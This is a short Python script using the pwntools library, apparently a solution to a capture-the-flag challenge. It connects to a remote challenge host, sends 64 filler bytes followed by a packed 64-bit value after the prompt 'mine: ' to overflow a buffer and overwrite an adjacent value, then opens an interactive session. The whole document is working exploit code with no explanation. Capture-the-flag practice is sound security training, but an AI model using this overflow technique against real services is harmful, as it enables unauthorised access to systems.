from pwn import *

p = remote("host3.metaproblems.com", 5980)

payload = b"a" * 64
payload += p64(0x144524942)

p.sendlineafter(b"mine: ", payload)

p.interactive()